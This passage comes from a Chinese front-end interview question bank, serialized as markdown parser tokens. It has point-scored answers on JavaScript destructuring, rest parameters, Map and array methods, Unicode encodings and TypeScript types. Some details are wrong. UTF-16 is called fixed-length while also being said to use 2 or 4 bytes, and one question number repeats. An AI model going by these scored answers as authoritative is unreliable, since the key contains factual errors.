在解构数组时，以元素的位置为匹配条件来提取想要的数据的\\n","text":"数组的解构 在解构数组时，以元素的位置为匹配条件来提取想要的数据的","tokens":[{"type":"text","raw":"数组的解构 在解构数组时，以元素的位置为匹配条件来提取想要的数据的","text":"数组的解构 在解构数组时，以元素的位置为匹配条件来提取想要的数据的","escaped":false}]}]},{"type":"list_item","raw":"- 对象的解构 对象解构比数组结构稍微复杂一些，也更显强大。在解构对象时，是以属性的名称为匹配条件，来提取想要的数据的","task":false,"loose":true,"text":"对象的解构 对象解构比数组结构稍微复杂一些，也更显强大。在解构对象时，是以属性的名称为匹配条件，来提取想要的数据的","tokens":[{"type":"text","raw":"对象的解构 对象解构比数组结构稍微复杂一些，也更显强大。在解构对象时，是以属性的名称为匹配条件，来提取想要的数据的","text":"对象的解构 对象解构比数组结构稍微复杂一些，也更显强大。在解构对象时，是以属性的名称为匹配条件，来提取想要的数据的","tokens":[{"type":"text","raw":"对象的解构 对象解构比数组结构稍微复杂一些，也更显强大。在解构对象时，是以属性的名称为匹配条件，来提取想要的数据的","text":"对象的解构 对象解构比数组结构稍微复杂一些，也更显强大。在解构对象时，是以属性的名称为匹配条件，来提取想要的数据的","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 68. 对 rest 参数的理解\\n\\n","depth":2,"text":"68. 对 rest 参数的理解","tokens":[{"type":"text","raw":"68. 对 rest 参数的理解","text":"68. 对 rest 参数的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 扩展运算符被用在函数形参上时，它还可以把一个分离的参数序列整合成一个数组：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 扩展运算符被用在函数形参上时，它还可以把一个分离的参数序列整合成一个数组：","task":false,"loose":false,"text":"扩展运算符被用在函数形参上时，它还可以把一个分离的参数序列整合成一个数组：","tokens":[{"type":"text","raw":"扩展运算符被用在函数形参上时，它还可以把一个分离的参数序列整合成一个数组：","text":"扩展运算符被用在函数形参上时，它还可以把一个分离的参数序列整合成一个数组：","tokens":[{"type":"text","raw":"扩展运算符被用在函数形参上时，它还可以把一个分离的参数序列整合成一个数组：","text":"扩展运算符被用在函数形参上时，它还可以把一个分离的参数序列整合成一个数组：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"``` js\\nfunction mutiple(...args) {\\n  let result = 1;\\n  for (var val of args) {\\n    result *= val;\\n  }\\n  return result;\\n}\\nmutiple(1, 2, 3, 4) // 24\\n\\n```","lang":"js","text":"function mutiple(...args) {\\n  let result = 1;\\n  for (var val of args) {\\n    result *= val;\\n  }\\n  return result;\\n}\\nmutiple(1, 2, 3, 4) // 24\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 这里，传入 mutiple 的是四个分离的参数，但是如果在 mutiple 函数里尝试输出 args 的值，会发现它是一个数组：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 这里，传入 mutiple 的是四个分离的参数，但是如果在 mutiple 函数里尝试输出 args 的值，会发现它是一个数组：","task":false,"loose":false,"text":"这里，传入 mutiple 的是四个分离的参数，但是如果在 mutiple 函数里尝试输出 args 的值，会发现它是一个数组：","tokens":[{"type":"text","raw":"这里，传入 mutiple 的是四个分离的参数，但是如果在 mutiple 函数里尝试输出 args 的值，会发现它是一个数组：","text":"这里，传入 mutiple 的是四个分离的参数，但是如果在 mutiple 函数里尝试输出 args 的值，会发现它是一个数组：","tokens":[{"type":"text","raw":"这里，传入 mutiple 的是四个分离的参数，但是如果在 mutiple 函数里尝试输出 args 的值，会发现它是一个数组：","text":"这里，传入 mutiple 的是四个分离的参数，但是如果在 mutiple 函数里尝试输出 args 的值，会发现它是一个数组：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"``` js\\nfunction mutiple(...args) {\\n  console.log(args)\\n}\\nmutiple(1, 2, 3, 4) // [1, 2, 3, 4]\\n\\n```","lang":"js","text":"function mutiple(...args) {\\n  console.log(args)\\n}\\nmutiple(1, 2, 3, 4) // [1, 2, 3, 4]\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 这就是 … rest运算符的又一层威力了，它可以把函数的多个入参收敛进一个数组里。这一点经常用于获取函数的多余参数，或者像上面这样处理函数参数个数不确定的情况。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 这就是 … rest运算符的又一层威力了，它可以把函数的多个入参收敛进一个数组里。这一点经常用于获取函数的多余参数，或者像上面这样处理函数参数个数不确定的情况。","task":false,"loose":false,"text":"这就是 … rest运算符的又一层威力了，它可以把函数的多个入参收敛进一个数组里。这一点经常用于获取函数的多余参数，或者像上面这样处理函数参数个数不确定的情况。","tokens":[{"type":"text","raw":"这就是 … rest运算符的又一层威力了，它可以把函数的多个入参收敛进一个数组里。这一点经常用于获取函数的多余参数，或者像上面这样处理函数参数个数不确定的情况。","text":"这就是 … rest运算符的又一层威力了，它可以把函数的多个入参收敛进一个数组里。这一点经常用于获取函数的多余参数，或者像上面这样处理函数参数个数不确定的情况。","tokens":[{"type":"text","raw":"这就是 … rest运算符的又一层威力了，它可以把函数的多个入参收敛进一个数组里。这一点经常用于获取函数的多余参数，或者像上面这样处理函数参数个数不确定的情况。","text":"这就是 … rest运算符的又一层威力了，它可以把函数的多个入参收敛进一个数组里。这一点经常用于获取函数的多余参数，或者像上面这样处理函数参数个数不确定的情况。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 68. Map数据结构有哪些操作方法？\\n\\n","depth":2,"text":"68. Map数据结构有哪些操作方法？","tokens":[{"type":"text","raw":"68. Map数据结构有哪些操作方法？","text":"68. Map数据结构有哪些操作方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- size： map.size 返回Map结构的成员总数。\\n\\n- set(key,value)：设置键名key对应的键值value，然后返回整个Map结构，如果key已经有值，则键值会被更新，否则就新生成该键。（因为返回的是当前Map对象，所以可以链式调用）\\n\\n- get(key)：读取key对应的键值，如果找不到key，返回undefined。\\n\\n- has(key)：返回一个布尔值，表示某个键是否在当前Map对象中。\\n\\n- delete(key)：删除某个键，返回true。如果删除失败，返回false。\\n\\n- clear()：清除所有成员，没有返回值。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- size： map.size 返回Map结构的成员总数。\\n\\n","task":false,"loose":true,"text":"size： map.size 返回Map结构的成员总数。\\n","tokens":[{"type":"text","raw":"size： map.size 返回Map结构的成员总数。\\n","text":"size： map.size 返回Map结构的成员总数。","tokens":[{"type":"text","raw":"size： map.size 返回Map结构的成员总数。","text":"size： map.size 返回Map结构的成员总数。","escaped":false}]}]},{"type":"list_item","raw":"- set(key,value)：设置键名key对应的键值value，然后返回整个Map结构，如果key已经有值，则键值会被更新，否则就新生成该键。（因为返回的是当前Map对象，所以可以链式调用）\\n\\n","task":false,"loose":true,"text":"set(key,value)：设置键名key对应的键值value，然后返回整个Map结构，如果key已经有值，则键值会被更新，否则就新生成该键。（因为返回的是当前Map对象，所以可以链式调用）\\n","tokens":[{"type":"text","raw":"set(key,value)：设置键名key对应的键值value，然后返回整个Map结构，如果key已经有值，则键值会被更新，否则就新生成该键。（因为返回的是当前Map对象，所以可以链式调用）\\n","text":"set(key,value)：设置键名key对应的键值value，然后返回整个Map结构，如果key已经有值，则键值会被更新，否则就新生成该键。（因为返回的是当前Map对象，所以可以链式调用）","tokens":[{"type":"text","raw":"set(key,value)：设置键名key对应的键值value，然后返回整个Map结构，如果key已经有值，则键值会被更新，否则就新生成该键。（因为返回的是当前Map对象，所以可以链式调用）","text":"set(key,value)：设置键名key对应的键值value，然后返回整个Map结构，如果key已经有值，则键值会被更新，否则就新生成该键。（因为返回的是当前Map对象，所以可以链式调用）","escaped":false}]}]},{"type":"list_item","raw":"- get(key)：读取key对应的键值，如果找不到key，返回undefined。\\n\\n","task":false,"loose":true,"text":"get(key)：读取key对应的键值，如果找不到key，返回undefined。\\n","tokens":[{"type":"text","raw":"get(key)：读取key对应的键值，如果找不到key，返回undefined。\\n","text":"get(key)：读取key对应的键值，如果找不到key，返回undefined。","tokens":[{"type":"text","raw":"get(key)：读取key对应的键值，如果找不到key，返回undefined。","text":"get(key)：读取key对应的键值，如果找不到key，返回undefined。","escaped":false}]}]},{"type":"list_item","raw":"- has(key)：返回一个布尔值，表示某个键是否在当前Map对象中。\\n\\n","task":false,"loose":true,"text":"has(key)：返回一个布尔值，表示某个键是否在当前Map对象中。\\n","tokens":[{"type":"text","raw":"has(key)：返回一个布尔值，表示某个键是否在当前Map对象中。\\n","text":"has(key)：返回一个布尔值，表示某个键是否在当前Map对象中。","tokens":[{"type":"text","raw":"has(key)：返回一个布尔值，表示某个键是否在当前Map对象中。","text":"has(key)：返回一个布尔值，表示某个键是否在当前Map对象中。","escaped":false}]}]},{"type":"list_item","raw":"- delete(key)：删除某个键，返回true。如果删除失败，返回false。\\n\\n","task":false,"loose":true,"text":"delete(key)：删除某个键，返回true。如果删除失败，返回false。\\n","tokens":[{"type":"text","raw":"delete(key)：删除某个键，返回true。如果删除失败，返回false。\\n","text":"delete(key)：删除某个键，返回true。如果删除失败，返回false。","tokens":[{"type":"text","raw":"delete(key)：删除某个键，返回true。如果删除失败，返回false。","text":"delete(key)：删除某个键，返回true。如果删除失败，返回false。","escaped":false}]}]},{"type":"list_item","raw":"- clear()：清除所有成员，没有返回值。","task":false,"loose":true,"text":"clear()：清除所有成员，没有返回值。","tokens":[{"type":"text","raw":"clear()：清除所有成员，没有返回值。","text":"clear()：清除所有成员，没有返回值。","tokens":[{"type":"text","raw":"clear()：清除所有成员，没有返回值。","text":"clear()：清除所有成员，没有返回值。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 69. 数组有哪些原生方法？\\n\\n","depth":2,"text":"69. 数组有哪些原生方法？","tokens":[{"type":"text","raw":"69. 数组有哪些原生方法？","text":"69. 数组有哪些原生方法？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。\\n\\n- 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。\\n\\n- 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。\\n\\n- 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。\\n\\n- 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。\\n\\n- 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法\\n\\n- reduce() 和 reduceRight() 方法将数组元素计算为一个值，这对求和非常有用","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。\\n\\n","task":false,"loose":true,"text":"数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。\\n","tokens":[{"type":"text","raw":"数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。\\n","text":"数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","tokens":[{"type":"text","raw":"数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","text":"数组和字符串的转换方法：toString()、toLocalString()、join() 其中 join() 方法可以指定转换为字符串时的分隔符。","escaped":false}]}]},{"type":"list_item","raw":"- 数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。\\n\\n","task":false,"loose":true,"text":"数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。\\n","tokens":[{"type":"text","raw":"数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。\\n","text":"数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","tokens":[{"type":"text","raw":"数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","text":"数组尾部操作的方法 pop() 和 push()，push 方法可以传入多个参数。","escaped":false}]}]},{"type":"list_item","raw":"- 数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。\\n\\n","task":false,"loose":true,"text":"数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。\\n","tokens":[{"type":"text","raw":"数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。\\n","text":"数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","tokens":[{"type":"text","raw":"数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","text":"数组首部操作的方法 shift() 和 unshift() 重排序的方法 reverse() 和 sort()，sort() 方法可以传入一个函数来进行比较，传入前后两个值，如果返回值为正数，则交换两个参数的位置。","escaped":false}]}]},{"type":"list_item","raw":"- 数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。\\n\\n","task":false,"loose":true,"text":"数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。\\n","tokens":[{"type":"text","raw":"数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。\\n","text":"数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","tokens":[{"type":"text","raw":"数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","text":"数组连接的方法 concat() ，返回的是拼接好的数组，不影响原数组。","escaped":false}]}]},{"type":"list_item","raw":"- 数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。\\n\\n","task":false,"loose":true,"text":"数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。\\n","tokens":[{"type":"text","raw":"数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。\\n","text":"数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","tokens":[{"type":"text","raw":"数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","text":"数组截取办法 slice()，用于截取数组中的一部分返回，不影响原数组。","escaped":false}]}]},{"type":"list_item","raw":"- 数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法\\n\\n","task":false,"loose":true,"text":"数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法\\n","tokens":[{"type":"text","raw":"数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法\\n","text":"数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","tokens":[{"type":"text","raw":"数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","text":"数组插入方法 splice()，影响原数组查找特定项的索引的方法，indexOf() 和 lastIndexOf() 迭代方法 every()、some()、filter()、map() 和 forEach() 方法","escaped":false}]}]},{"type":"list_item","raw":"- reduce() 和 reduceRight() 方法将数组元素计算为一个值，这对求和非常有用","task":false,"loose":true,"text":"reduce() 和 reduceRight() 方法将数组元素计算为一个值，这对求和非常有用","tokens":[{"type":"text","raw":"reduce() 和 reduceRight() 方法将数组元素计算为一个值，这对求和非常有用","text":"reduce() 和 reduceRight() 方法将数组元素计算为一个值，这对求和非常有用","tokens":[{"type":"text","raw":"reduce() 和 reduceRight() 方法将数组元素计算为一个值，这对求和非常有用","text":"reduce() 和 reduceRight() 方法将数组元素计算为一个值，这对求和非常有用","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 70. Unicode、UTF-8、UTF-16、UTF-32的区别？\\n\\n","depth":2,"text":"70. Unicode、UTF-8、UTF-16、UTF-32的区别？","tokens":[{"type":"text","raw":"70. Unicode、UTF-8、UTF-16、UTF-32的区别？","text":"70. Unicode、UTF-8、UTF-16、UTF-32的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- Unicode 是一种字符集，包含了世界上所有的符号，每个符号对应一个唯一的编码，Unicode 的编码范围是 0x0000 至 0x10FFFF。\\n\\n- UTF-8、UTF-16、UTF-32 是三种不同的 Unicode 的编码方式，用于将 Unicode 的编码转换为字节序列，以便在计算机中存储和传输。\\n\\n- UTF-8 是一种变长的编码方式，使用 1 到 4 个字节来表示一个符号，根据不同的符号而变化字节长度。\\n\\n- UTF-16 是一种定长的编码方式，使用 2 个或 4 个字节来表示一个符号，根据不同的符号而变化字节长度。\\n\\n- UTF-32 是一种定长的编码方式，使用 4 个字节来表示一个符号，每个符号都使用 4 个字节来表示。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Unicode 是一种字符集，包含了世界上所有的符号，每个符号对应一个唯一的编码，Unicode 的编码范围是 0x0000 至 0x10FFFF。\\n\\n","task":false,"loose":true,"text":"Unicode 是一种字符集，包含了世界上所有的符号，每个符号对应一个唯一的编码，Unicode 的编码范围是 0x0000 至 0x10FFFF。\\n","tokens":[{"type":"text","raw":"Unicode 是一种字符集，包含了世界上所有的符号，每个符号对应一个唯一的编码，Unicode 的编码范围是 0x0000 至 0x10FFFF。\\n","text":"Unicode 是一种字符集，包含了世界上所有的符号，每个符号对应一个唯一的编码，Unicode 的编码范围是 0x0000 至 0x10FFFF。","tokens":[{"type":"text","raw":"Unicode 是一种字符集，包含了世界上所有的符号，每个符号对应一个唯一的编码，Unicode 的编码范围是 0x0000 至 0x10FFFF。","text":"Unicode 是一种字符集，包含了世界上所有的符号，每个符号对应一个唯一的编码，Unicode 的编码范围是 0x0000 至 0x10FFFF。","escaped":false}]}]},{"type":"list_item","raw":"- UTF-8、UTF-16、UTF-32 是三种不同的 Unicode 的编码方式，用于将 Unicode 的编码转换为字节序列，以便在计算机中存储和传输。\\n\\n","task":false,"loose":true,"text":"UTF-8、UTF-16、UTF-32 是三种不同的 Unicode 的编码方式，用于将 Unicode 的编码转换为字节序列，以便在计算机中存储和传输。\\n","tokens":[{"type":"text","raw":"UTF-8、UTF-16、UTF-32 是三种不同的 Unicode 的编码方式，用于将 Unicode 的编码转换为字节序列，以便在计算机中存储和传输。\\n","text":"UTF-8、UTF-16、UTF-32 是三种不同的 Unicode 的编码方式，用于将 Unicode 的编码转换为字节序列，以便在计算机中存储和传输。","tokens":[{"type":"text","raw":"UTF-8、UTF-16、UTF-32 是三种不同的 Unicode 的编码方式，用于将 Unicode 的编码转换为字节序列，以便在计算机中存储和传输。","text":"UTF-8、UTF-16、UTF-32 是三种不同的 Unicode 的编码方式，用于将 Unicode 的编码转换为字节序列，以便在计算机中存储和传输。","escaped":false}]}]},{"type":"list_item","raw":"- UTF-8 是一种变长的编码方式，使用 1 到 4 个字节来表示一个符号，根据不同的符号而变化字节长度。\\n\\n","task":false,"loose":true,"text":"UTF-8 是一种变长的编码方式，使用 1 到 4 个字节来表示一个符号，根据不同的符号而变化字节长度。\\n","tokens":[{"type":"text","raw":"UTF-8 是一种变长的编码方式，使用 1 到 4 个字节来表示一个符号，根据不同的符号而变化字节长度。\\n","text":"UTF-8 是一种变长的编码方式，使用 1 到 4 个字节来表示一个符号，根据不同的符号而变化字节长度。","tokens":[{"type":"text","raw":"UTF-8 是一种变长的编码方式，使用 1 到 4 个字节来表示一个符号，根据不同的符号而变化字节长度。","text":"UTF-8 是一种变长的编码方式，使用 1 到 4 个字节来表示一个符号，根据不同的符号而变化字节长度。","escaped":false}]}]},{"type":"list_item","raw":"- UTF-16 是一种定长的编码方式，使用 2 个或 4 个字节来表示一个符号，根据不同的符号而变化字节长度。\\n\\n","task":false,"loose":true,"text":"UTF-16 是一种定长的编码方式，使用 2 个或 4 个字节来表示一个符号，根据不同的符号而变化字节长度。\\n","tokens":[{"type":"text","raw":"UTF-16 是一种定长的编码方式，使用 2 个或 4 个字节来表示一个符号，根据不同的符号而变化字节长度。\\n","text":"UTF-16 是一种定长的编码方式，使用 2 个或 4 个字节来表示一个符号，根据不同的符号而变化字节长度。","tokens":[{"type":"text","raw":"UTF-16 是一种定长的编码方式，使用 2 个或 4 个字节来表示一个符号，根据不同的符号而变化字节长度。","text":"UTF-16 是一种定长的编码方式，使用 2 个或 4 个字节来表示一个符号，根据不同的符号而变化字节长度。","escaped":false}]}]},{"type":"list_item","raw":"- UTF-32 是一种定长的编码方式，使用 4 个字节来表示一个符号，每个符号都使用 4 个字节来表示。","task":false,"loose":true,"text":"UTF-32 是一种定长的编码方式，使用 4 个字节来表示一个符号，每个符号都使用 4 个字节来表示。","tokens":[{"type":"text","raw":"UTF-32 是一种定长的编码方式，使用 4 个字节来表示一个符号，每个符号都使用 4 个字节来表示。","text":"UTF-32 是一种定长的编码方式，使用 4 个字节来表示一个符号，每个符号都使用 4 个字节来表示。","tokens":[{"type":"text","raw":"UTF-32 是一种定长的编码方式，使用 4 个字节来表示一个符号，每个符号都使用 4 个字节来表示。","text":"UTF-32 是一种定长的编码方式，使用 4 个字节来表示一个符号，每个符号都使用 4 个字节来表示。","escaped":false}]}]}]}]},{"key":"TypeScript","content":"<h1>TypeScript</h1>\\n<h2>1. ts 如何定义对象结构体</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">interface Person {\\n    name: string;\\n    age: number;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> type 也可以用于定义类型</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">type Person = {\\n    name: string;\\n    age: number;\\n}\\n</code></pre>\\n<h2>2. type 和 interface的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> interface 可以重复声明，type 不行</li>\\n<li><strong>1：</strong> 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好</li>\\n<li>建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。</li>\\n</ul>\\n</details>\\n\\n<h2>3. 常用工具类型？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> Partial：满足部分属性(一个都没满足也可)即可</li>\\n<li><strong>1：</strong> Required：所有属性都需要</li>\\n<li><strong>1：</strong> Readonly: 包装后的所有属性只读</li>\\n<li><strong>1：</strong> Pick: 选取部分属性</li>\\n<li><strong>1：</strong> Omit: 去除部分属性</li>\\n<li><strong>1：</strong> Extract: 交集</li>\\n<li><strong>1：</strong> Exclude: 差集</li>\\n</ul>\\n</details>\\n\\n<h2>4. any、never、unknown、null &amp; undefined 和 void 有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> any: 动态的变量类型（失去了类型检查的作用）</li>\\n<li><strong>1：</strong> never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型</li>\\n<li><strong>1：</strong> unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型</li>\\n<li><strong>1：</strong> null &amp; undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自</li>\\n<li><strong>1：</strong> void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void</li>\\n</ul>\\n</details>\\n\\n<h2>5. ?.、??、!、!.、_、** 